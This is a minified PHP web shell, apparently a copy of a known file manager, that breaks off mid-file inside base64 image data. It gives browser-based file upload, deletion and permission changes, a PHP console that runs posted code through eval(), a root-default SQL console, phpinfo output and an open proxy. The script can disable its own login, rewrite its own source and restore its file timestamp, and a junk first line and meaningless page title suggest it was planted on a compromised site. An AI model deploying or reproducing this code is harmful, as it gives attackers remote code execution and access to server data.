asdadsasd
<?php
 $a=explode(' ',microtime());$a=$a[1]+$a[0];$c=array('en','ru','de','fr','uk');$d=empty($_REQUEST['path'])?$d=realpath('.'):realpath($_REQUEST['path']);$d=str_replace('\\','/',$d).'/';$e=str_replace('\\','/',realpath('./'));$g=(version_compare(phpversion(),"5.3.0","<"))?true:false;$h='';$k='de';$l=true;$m=1.4;$o=array('make_directory'=>true,'new_file'=>true,'upload_file'=>true,'show_dir_size'=>false,'show_img'=>true,'show_php_ver'=>true,'show_php_ini'=>false,'show_gt'=>true,'enable_php_console'=>true,'enable_sql_console'=>true,'sql_server'=>'localhost','sql_username'=>'root','sql_password'=>'','sql_db'=>'test_base','enable_proxy'=>true,'show_phpinfo'=>true,'show_xls'=>true,'fm_settings'=>true,'restore_time'=>true,'fm_restore_time'=>false,);if(empty($_COOKIE['fm_config']))$p=$o;else $p=unserialize($_COOKIE['fm_config']);if(isset($_POST['fm_lang'])){setcookie('fm_lang',$_POST['fm_lang'],time()+(86400*$q['days_authorization']));$_COOKIE['fm_lang']=$_POST['fm_lang'];}$r=$k;if($l&&!empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])&&empty($_COOKIE['fm_lang'])){$s=explode(',',$_SERVER['HTTP_ACCEPT_LANGUAGE']);if(!empty($s)){foreach($s as $t){$u=explode(';',$t);$u=$u[0];if(in_array($u,$c)){$r=$u;break;}}}}$r=(empty($_COOKIE['fm_lang']))?$r:$_COOKIE['fm_lang'];function __($w){global $x;if(isset($x[$w]))return $x[$w];else return $w;};function fm_del_files($y,$z=false){if($z&&@is_dir($y)){$aa=fm_scan_dir($y,'','',true);foreach($aa as $bb){if($bb!='.'&&$bb!='..'){fm_del_files($y.'/'.$bb,true);}}}if(@is_dir($y)){return rmdir($y);}else{return@unlink($y);}}function fm_rights_string($y,$cc=false){$dd=fileperms($y);$ee='';if(!$cc){if(($dd&0xC000)==0xC000){$ee='s';}elseif(($dd&0xA000)==0xA000){$ee='l';}elseif(($dd&0x8000)==0x8000){$ee='-';}elseif(($dd&0x6000)==0x6000){$ee='b';}elseif(($dd&0x4000)==0x4000){$ee='d';}elseif(($dd&0x2000)==0x2000){$ee='c';}elseif(($dd&0x1000)==0x1000){$ee='p';}else{$ee='u';}}$ee.=(($dd&0x0100)?'r':'-');$ee.=(($dd&0x0080)?'w':'-');$ee.=(($dd&0x0040)?(($dd&0x0800)?'s':'x'):(($dd&0x0800)?'S':'-'));$ee.=(($dd&0x0020)?'r':'-');$ee.=(($dd&0x0010)?'w':'-');$ee.=(($dd&0x0008)?(($dd&0x0400)?'s':'x'):(($dd&0x0400)?'S':'-'));$ee.=(($dd&0x0004)?'r':'-');$ee.=(($dd&0x0002)?'w':'-');$ee.=(($dd&0x0001)?(($dd&0x0200)?'t':'x'):(($dd&0x0200)?'T':'-'));return $ee;}function fm_convert_rights($ff){$ff=str_pad($ff,9,'-');$gg=array('-'=>'0','r'=>'4','w'=>'2','x'=>'1');$ff=strtr($ff,$gg);$hh='0';$ii=(int) $ff[0]+(int) $ff[1]+(int) $ff[2];$jj=(int) $ff[3]+(int) $ff[4]+(int) $ff[5];$kk=(int) $ff[6]+(int) $ff[7]+(int) $ff[8];$hh.=$ii.$jj.$kk;return intval($hh,8);}function fm_chmod($y,$ll,$mm=false){$nn=@chmod(realpath($y),$ll);if(@is_dir($y)&&$mm){$aa=fm_scan_dir($y);foreach($aa as $bb){$nn=$nn&&fm_chmod($y.'/'.$bb,$ll,true);}}return $nn;}function fm_download($oo){if(!empty($oo)){if(file_exists($oo)){header("Content-Disposition: attachment; filename=".basename($oo));header("Content-Type: application/force-download");header("Content-Type: application/octet-stream");header("Content-Type: application/download");header("Content-Description: File Transfer");header("Content-Length: ".filesize($oo));flush();$pp=fopen($oo,"r");while(!feof($pp)){echo fread($pp,65536);flush();}fclose($pp);die();}else{header('HTTP/1.0 404 Not Found',true,404);header('Status: 404 Not Found');die();}}}function fm_dir_size($qq,$rr=true){if($rr){$ss=fm_dir_size($qq,false);if($ss<=1024)return $ss.' bytes';elseif($ss<=1024*1024)return round($ss/(1024),2).'&nbsp;Kb';elseif($ss<=1024*1024*1024)return round($ss/(1024*1024),2).'&nbsp;Mb';elseif($ss<=1024*1024*1024*1024)return round($ss/(1024*1024*1024),2).'&nbsp;Gb';elseif($ss<=1024*1024*1024*1024*1024)return round($ss/(1024*1024*1024*1024),2).'&nbsp;Tb';else return round($ss/(1024*1024*1024*1024*1024),2).'&nbsp;Pb';}else{if(is_file($qq))return filesize($qq);$ss=0;$tt=opendir($qq);while(($y=readdir($tt))!==false){if($y=='.'||$y=='..')continue;if(is_file($qq.'/'.$y))$ss+=filesize($qq.'/'.$y);else $ss+=fm_dir_size($qq.'/'.$y,false);}closedir($tt);return $ss+filesize($qq);}}function fm_scan_dir($uu,$vv='',$ww='all',$xx=false){$yy=$zz=array();if(!empty($vv)){$vv='/^'.str_replace('*','(.*)',str_replace('.','\\.',$vv)).'$/';}if(!empty($ww)&&$ww!=='all'){$aaa='is_'.$ww;}if(@is_dir($uu)){$bbb=opendir($uu);while(false!==($ccc=readdir($bbb))){if(substr($ccc,0,1)!='.'||$xx){if((empty($ww)||$ww=='all'||$aaa($uu.'/'.$ccc))&&(empty($vv)||preg_match($vv,$ccc))){$yy[]=$ccc;}}}closedir($bbb);natsort($yy);}return $yy;}function fm_link($ddd,$eee,$fff,$ggg=''){if(empty($ggg))$ggg=$fff.' '.basename($eee);return '&nbsp;&nbsp;<a href="?'.$ddd.'='.base64_encode($eee).'" title="'.$ggg.'">'.$fff.'</a>';}function fm_arr_to_option($hhh,$iii,$jjj=''){foreach($hhh as $kkk){$lll=$kkk[$iii];$nn.='<option value="'.$lll.'" '.($jjj&&$jjj==$lll?'selected':'').'>'.$lll.'</option>';}return $nn;}function fm_lang_form($mmm='en'){return '
<form name="change_lang" method="post" action="">
	<select name="fm_lang" title="'.__('Language').'" onchange="document.forms[\'change_lang\'].submit()" >
		<option value="en" '.($mmm=='en'?'selected="selected" ':'').'>'.__('English').'</option>
		<option value="de" '.($mmm=='de'?'selected="selected" ':'').'>'.__('German').'</option>
		<option value="ru" '.($mmm=='ru'?'selected="selected" ':'').'>'.__('Russian').'</option>
		<option value="fr" '.($mmm=='fr'?'selected="selected" ':'').'>'.__('French').'</option>
		<option value="uk" '.($mmm=='uk'?'selected="selected" ':'').'>'.__('Ukrainian').'</option>
	</select>
</form>
';}function fm_root($nnn){return($nnn=='.'OR $nnn=='..');}function fm_php($ooo){$ppp=ini_get('display_errors');ini_set('display_errors','1');ob_start();eval(trim($ooo));$w=ob_get_contents();ob_end_clean();ini_set('display_errors',$ppp);return $w;}function fm_sql_connect(){global $p;return new mysqli($p['sql_server'],$p['sql_username'],$p['sql_password'],$p['sql_db']);}function fm_sql($qqq){global $p;$qqq=trim($qqq);ob_start();$rrr=fm_sql_connect();if($rrr->connect_error){ob_end_clean();return $rrr->connect_error;}$rrr->set_charset('utf8');$sss=mysqli_query($rrr,$qqq);if($sss===false){ob_end_clean();return mysqli_error($rrr);}else{if(!empty($sss)){while($ttt=mysqli_fetch_assoc($sss)){$uuu[]=$ttt;}}$vvv=empty($uuu)?'':var_export($uuu,true);ob_end_clean();$rrr->close();return '<pre>'.stripslashes($vvv).'</pre>';}}function fm_backup_tables($www='*',$xxx=true){global $d;$yyy=fm_sql_connect();$zzz="; \n  \n";if($www=='*'){$www=array();$aaaa=$yyy->query('SHOW TABLES');while($ttt=mysqli_fetch_row($aaaa)){$www[]=$ttt[0];}}else{$www=is_array($www)?$www:explode(',',$www);}$bbbb='';foreach($www as $cccc){$aaaa=$yyy->query('SELECT * FROM '.$cccc);$dddd=mysqli_num_fields($aaaa);$bbbb.='DROP TABLE IF EXISTS `'.$cccc.'`'.$zzz;$eeee=mysqli_fetch_row($yyy->query('SHOW CREATE TABLE '.$cccc));$bbbb.=$eeee[1].$zzz;if($xxx){for($ffff=0;$ffff<$dddd;$ffff++){while($ttt=mysqli_fetch_row($aaaa)){$bbbb.='INSERT INTO `'.$cccc.'` VALUES(';for($gggg=0;$gggg<$dddd;$gggg++){$ttt[$gggg]=addslashes($ttt[$gggg]);$ttt[$gggg]=str_replace("\n","\\n",$ttt[$gggg]);if(isset($ttt[$gggg])){$bbbb.='"'.$ttt[$gggg].'"';}else{$bbbb.='""';}if($gggg<($dddd-1)){$bbbb.=',';}}$bbbb.=')'.$zzz;}}}else{$bbbb=preg_replace("#AUTO_INCREMENT=[\d]+ #is",'',$bbbb);}$bbbb.="\n\n\n";}$y=gmdate("Y-m-d_H-i-s",time()).'.sql';$hhhh=fopen($y,'w+');fwrite($hhhh,$bbbb);fclose($hhhh);$iiii='onClick="if(confirm(\''.__('File selected').': \n'.$y.'. \n'.__('Are you sure you want to delete this file?').'\')) document.location.href = \'?delete='.$y.'&path='.$d.'\'"';return $y.': '.fm_link('download',$d.$y,__('Download'),__('Download').' '.$y).' <a href="#" title="'.__('Delete').' '.$y.'" '.$iiii.'>'.__('Delete').'</a>';}function fm_restore_tables($jjjj){$yyy=fm_sql_connect();$zzz="; \n  \n";$qq=fopen($jjjj,"r+");$kkkk=fread($qq,filesize($jjjj));$llll=explode($zzz,$kkkk);foreach($llll as $mmmm){if(strlen($mmmm)>3){$aaaa=$yyy->query($mmmm);if(!$aaaa){$nnnn=mysqli_errno($yyy->connection);$oooo=mysqli_error($yyy->connection);$pppp=$mmmm;break;}}}if(empty($nnnn))return __('Success').' — '.$jjjj;else return $oooo.'<br/>'.$mmmm;}function fm_img_link($ccc){return'./'.basename(__FILE__).'?img='.base64_encode($ccc);}function fm_home_style(){return '
input, input.fm_input {
	text-indent: 2px;
}

input, textarea, select, input.fm_input {
	color: black;
	font: normal 8pt Verdana, Arial, Helvetica, sans-serif;
	border-color: black;
	background-color: #FCFCFC none !important;
	border-radius: 0;
	padding: 2px;
}

input.fm_input {
	background: #FCFCFC none !important;
	cursor: pointer;
}

.home {
	background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAgRQTFRF/f396Ojo////tT02zr+fw66Rtj432TEp3MXE2DAr3TYp1y4mtDw2/7BM/7BOqVpc/8l31jcqq6enwcHB2Tgi5jgqVpbFvra2nBAV/Pz82S0jnx0W3TUkqSgi4eHh4Tsre4wosz026uPjzGYd6Us3ynAydUBA5Kl3fm5eqZaW7ODgi2Vg+Pj4uY+EwLm5bY9U//7jfLtC+tOK3jcm/71u2jYo1UYh5aJl/seC3jEm12kmJrIA1jMm/9aU4Lh0e01BlIaE///dhMdC7IA//fTZ2c3MW6nN30wf95Vd4JdXoXVos8nE4efN/+63IJgSnYhl7F4csXt89GQUwL+/jl1c41Aq+fb2gmtI1rKa2C4kJaIA3jYrlTw5tj423jYn3cXE1zQoxMHBp1lZ3Dgmqiks/+mcjLK83jYkymMV3TYk//HM+u7Whmtr0odTpaOjfWJfrHpg/8Bs/7tW/7Ve+4U52DMm3MLBn4qLgNVM6MzB3lEflIuL/+jA///20LOzjXx8/7lbWpJG2C8k3TosJKMA1ywjopOR1zYp5Dspiay+yKNhqKSk8NW6/fjns7Oz2tnZuz887b+W3aRY/+ms4rCE3Tot7V85bKxjuEA3w45Vh5uhq6am4cFxgZZW/9qIuwgKy0sW+ujT4TQntz423C8i3zUj/+Kw/a5d6UMxuL6wzDEr////cqJQfAAAAKx0Uk5T////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAWVFbEAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAA2UlEQVQoU2NYjQYYsAiE8U9YzDYjVpGZRxMiECitMrVZvoMrTlQ2ESRQJ2FVwinYbmqTULoohnE1g1aKGS/fNMtk40yZ9KVLQhgYkuY7NxQvXyHVFNnKzR69qpxBPMez0ETAQyTUvSogaIFaPcNqV/M5dha2Rl2Timb6Z+QBDY1XN/Sbu8xFLG3eLDfl2UABjilO1o012Z3ek1lZVIWAAmUTK6L0s3pX+jj6puZ2AwWUvBRaphswMdUujCiwDwa5VEdPI7ynUlc7v1qYURLquf42hz45CBPDtwACrm+RDcxJYAAAAABJRU5ErkJggg==");
	background-repeat: no-repeat;
}';}function fm_config_checkbox_row($fff,$qqqq){global $p;return '<tr><td class="row1"><input id="fm_config_'.$qqqq.'" name="fm_config['.$qqqq.']" value="1" '.(empty($p[$qqqq])?'':'checked="true"').' type="checkbox"></td><td class="row2 whole"><label for="fm_config_'.$qqqq.'">'.$fff.'</td></tr>';}function fm_protocol(){if(isset($_SERVER['HTTP_SCHEME']))return $_SERVER['HTTP_SCHEME'].'://';if(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']=='on')return 'https://';if(isset($_SERVER['SERVER_PORT'])&&$_SERVER['SERVER_PORT']==443)return 'https://';if(isset($_SERVER['HTTP_X_FORWARDED_PROTO'])&&$_SERVER['HTTP_X_FORWARDED_PROTO']=='https')return 'https://';return 'http://';}function fm_site_url(){return fm_protocol().$_SERVER['HTTP_HOST'];}function fm_url($rrrr=false){$ssss=$rrrr?fm_site_url():'.';return $ssss.'/'.basename(__FILE__);}function fm_home($rrrr=false){return '&nbsp;<a href="'.fm_url($rrrr).'" title="'.__('Home').'"><span class="home">&nbsp;&nbsp;&nbsp;&nbsp;</span></a>';}function fm_run_input($u){global $p;$bbbb=!empty($p['enable_'.$u.'_console'])?'
				<form  method="post" action="'.fm_url().'" style="display:inline">
				<input type="submit" name="'.$u.'run" value="'.strtoupper($u).' '.__('Console').'">
				</form>
':'';return $bbbb;}function fm_url_proxy($tttt){$eee=str_replace('&amp;','&',$tttt[2]);$uuuu=isset($_GET['url'])?$_GET['url']:'';$vvvv=parse_url($uuuu);$ssss=$vvvv['scheme'].'://'.$vvvv['host'].'/';if(substr($eee,0,2)=='//'){$eee=substr_replace($eee,fm_protocol(),0,2);}elseif(substr($eee,0,1)=='/'){$eee=substr_replace($eee,$ssss,0,1);}elseif(substr($eee,0,2)=='./'){$eee=substr_replace($eee,$ssss,0,2);}elseif(substr($eee,0,4)=='http'){}else{$eee=$ssss.$eee;}if($tttt[1]=='href'&&!strripos($eee,'css')){$wwww=fm_site_url().'/'.basename(__FILE__);$xxxx=$wwww.'?proxy=true&url=';$eee=$xxxx.urlencode($eee);}elseif(strripos($eee,'css')){}return $tttt[1].'="'.$eee.'"';}function fm_tpl_form($yyyy){global${$yyyy.'_templates'};$zzzz=json_decode(${$yyyy.'_templates'},true);$aaaaa='';foreach($zzzz as $bbbbb=>$ccccc){$aaaaa.='<tr><td class="row1"><input name="'.$yyyy.'_name[]" value="'.$bbbbb.'"></td><td class="row2 whole"><textarea name="'.$yyyy.'_value[]"  cols="55" rows="5" class="textarea_input">'.$ccccc.'</textarea> <input name="del_'.rand().'" type="button" onClick="this.parentNode.parentNode.remove();" value="'.__('Delete').'"/></td></tr>';}return '
<table>
<tr><th colspan="2">'.strtoupper($yyyy).' '.__('templates').' '.fm_run_input($yyyy).'</th></tr>
<form method="post" action="">
<input type="hidden" value="'.$yyyy.'" name="tpl_edited">
<tr><td class="row1">'.__('Name').'</td><td class="row2 whole">'.__('Value').'</td></tr>
'.$aaaaa.'
<tr><td colspan="2" class="row3"><input name="res" type="button" onClick="document.location.href = \''.fm_url().'?fm_settings=true\';" value="'.__('Reset').'"/> <input type="submit" value="'.__('Save').'" ></td></tr>
</form>
<form method="post" action="">
<input type="hidden" value="'.$yyyy.'" name="tpl_edited">
<tr><td class="row1"><input name="'.$yyyy.'_new_name" value="" placeholder="'.__('New').' '.__('Name').'"></td><td class="row2 whole"><textarea name="'.$yyyy.'_new_value"  cols="55" rows="5" class="textarea_input" placeholder="'.__('New').' '.__('Value').'"></textarea></td></tr>
<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Add').'" ></td></tr>
</form>
</table>
';}function find_text_in_files($yy,$ddddd,$w){$eeeee=array();if($hhhh=opendir($yy)){while(false!==($fffff=readdir($hhhh))){if($fffff!="."&&$fffff!=".."){$d=$yy."/".$fffff;if(is_dir($d)){$eeeee=array_merge($eeeee,find_text_in_files($d,$ddddd,$w));}else{if(fnmatch($ddddd,$fffff)){$ggggg=file_get_contents($d);if(strpos($ggggg,$w)!==false){$eeeee[]=str_replace('//','/',$d);}}}}}closedir($hhhh);}return $eeeee;}if($q['authorize']){if(isset($_POST['login'])&&isset($_POST['password'])){if(($_POST['login']==$q['login'])&&($_POST['password']==$q['password'])){setcookie($q['cookie_name'],$q['login'].'|'.md5($q['password']),time()+(86400*$q['days_authorization']));$_COOKIE[$q['cookie_name']]=$q['login'].'|'.md5($q['password']);}}if(!isset($_COOKIE[$q['cookie_name']])OR($_COOKIE[$q['cookie_name']]!=$q['login'].'|'.md5($q['password']))){echo'
';die();}if(isset($_POST['quit'])){unset($_COOKIE[$q['cookie_name']]);setcookie($q['cookie_name'],'',time()-(86400*$q['days_authorization']));header('Location: '.fm_site_url().$_SERVER['REQUEST_URI']);}}if(isset($_GET['fm_settings'])){if(isset($_GET['fm_config_delete'])){unset($_COOKIE['fm_config']);setcookie('fm_config','',time()-(86400*$q['days_authorization']));header('Location: '.fm_url().'?fm_settings=true');exit(0);}elseif(isset($_POST['fm_config'])){$p=$_POST['fm_config'];setcookie('fm_config',serialize($p),time()+(86400*$q['days_authorization']));$_COOKIE['fm_config']=serialize($p);$h=__('Settings').' '.__('done');}elseif(isset($_POST['fm_login'])){if(empty($_POST['fm_login']['authorize']))$_POST['fm_login']=array('authorize'=>'0')+$_POST['fm_login'];$hhhhh=json_encode($_POST['fm_login']);$iiiii=file_get_contents(__FILE__);$jjjjj=preg_match('#authorization[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#',$iiiii,$tttt);if(!empty($tttt[1])){$kkkkk=filemtime(__FILE__);$lllll=str_replace('{"'.$tttt[1].'"}',$hhhhh,$iiiii);if(file_put_contents(__FILE__,$lllll)){$h.=__('File updated');if($_POST['fm_login']['login']!=$q['login'])$h.=' '.__('Login').': '.$_POST['fm_login']['login'];if($_POST['fm_login']['password']!=$q['password'])$h.=' '.__('Password').': '.$_POST['fm_login']['password'];$q=$_POST['fm_login'];}else $h.=__('Error occurred');if(!empty($p['fm_restore_time']))touch(__FILE__,$kkkkk);}}elseif(isset($_POST['tpl_edited'])){$yyyy=$_POST['tpl_edited'];if(!empty($_POST[$yyyy.'_name'])){$mmmmm=json_encode(array_combine($_POST[$yyyy.'_name'],$_POST[$yyyy.'_value']),JSON_HEX_APOS);}elseif(!empty($_POST[$yyyy.'_new_name'])){$mmmmm=json_encode(json_decode(${$yyyy.'_templates'},true)+array($_POST[$yyyy.'_new_name']=>$_POST[$yyyy.'_new_value']),JSON_HEX_APOS);}if(!empty($mmmmm)){$iiiii=file_get_contents(__FILE__);$jjjjj=preg_match('#'.$yyyy.'_templates[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#',$iiiii,$tttt);if(!empty($tttt[1])){$kkkkk=filemtime(__FILE__);$lllll=str_replace('{"'.$tttt[1].'"}',$mmmmm,$iiiii);if(file_put_contents(__FILE__,$lllll)){${$yyyy.'_templates'}=$mmmmm;$h.=__('File updated');}else $h.=__('Error occurred');if(!empty($p['fm_restore_time']))touch(__FILE__,$kkkkk);}}else $h.=__('Error occurred');}}if(isset($_GET['img'])){$y=base64_decode($_GET['img']);if($ee=getimagesize($y)){switch($ee[2]){case 1:$nnnnn='gif';break;case 2:$nnnnn='jpeg';break;case 3:$nnnnn='png';break;case 6:$nnnnn='bmp';break;default:die();}header("Content-type: image/$nnnnn");echo file_get_contents($y);die();}}if(isset($_GET['download'])){$y=base64_decode($_GET['download']);fm_download($y);}if(isset($_GET['phpinfo'])){phpinfo();die();}if(isset($_GET['proxy'])&&(!empty($p['enable_proxy']))){$uuuu=isset($_GET['url'])?urldecode($_GET['url']):'';$ooooo='
<div style="position:relative;z-index:100500;background: linear-gradient(to bottom, #e4f5fc 0%,#bfe8f9 50%,#9fd8ef 51%,#2ab0ed 100%);">
	<form action="" method="GET">
	<input type="hidden" name="proxy" value="true">
	'.fm_home().' <a href="'.$uuuu.'" target="_blank">Url</a>: <input type="text" name="url" value="'.$uuuu.'" size="55">
	<input type="submit" value="'.__('Show').'" class="fm_input">
	</form>
</div>
';if($uuuu){$ppppp=curl_init($uuuu);curl_setopt($ppppp,CURLOPT_USERAGENT,'Den1xxx test proxy');curl_setopt($ppppp,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ppppp,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ppppp,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ppppp,CURLOPT_HEADER,0);curl_setopt($ppppp,CURLOPT_REFERER,$uuuu);curl_setopt($ppppp,CURLOPT_RETURNTRANSFER,true);$aaaa=curl_exec($ppppp);curl_close($ppppp);$aaaa=preg_replace_callback('#(href|src)=["\'][http://]?([^:]*)["\']#Ui','fm_url_proxy',$aaaa);$aaaa=preg_replace('%(<body.*?>)%i','$1'.'<style>'.fm_home_style().'</style>'.$ooooo,$aaaa);echo $aaaa;die();}}?>
<!doctype html>
<html>
<head>     
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>1dfdif</title>
<style>
body {
	background-color:	white;
	font-family:		Verdana, Arial, Helvetica, sans-serif;
	font-size:			8pt;
	margin:				0px;
}

a:link, a:active, a:visited { color: #006699; text-decoration: none; }
a:hover { color: #DD6900; text-decoration: underline; }
a.th:link { color: #FFA34F; text-decoration: none; }
a.th:active { color: #FFA34F; text-decoration: none; }
a.th:visited { color: #FFA34F; text-decoration: none; }
a.th:hover {  color: #FFA34F; text-decoration: underline; }

table.bg {
	background-color: #ACBBC6
}

th, td { 
	font:	normal 8pt Verdana, Arial, Helvetica, sans-serif;
	padding: 3px;
}

th	{
	height:				25px;
	background-color:	#006699;
	color:				#FFA34F;
	font-weight:		bold;
	font-size:			11px;
}

.row1 {
	background-color:	#EFEFEF;
}

.row2 {
	background-color:	#DEE3E7;
}

.row3 {
	background-color:	#D1D7DC;
	padding: 5px;
}

tr.row1:hover {
	background-color:	#F3FCFC;
}

tr.row2:hover {
	background-color:	#F0F6F6;
}

.whole {
	width: 100%;
}

.all tbody td:first-child{width:100%;}

textarea {
	font: 9pt 'Courier New', courier;
	line-height: 125%;
	padding: 5px;
}

.textarea_input {
	height: 1em;
}

.textarea_input:focus {
	height: auto;
}

input[type=submit]{
	background: #FCFCFC none !important;
	cursor: pointer;
}

.folder {
    background-image: url("data:image/png;base64,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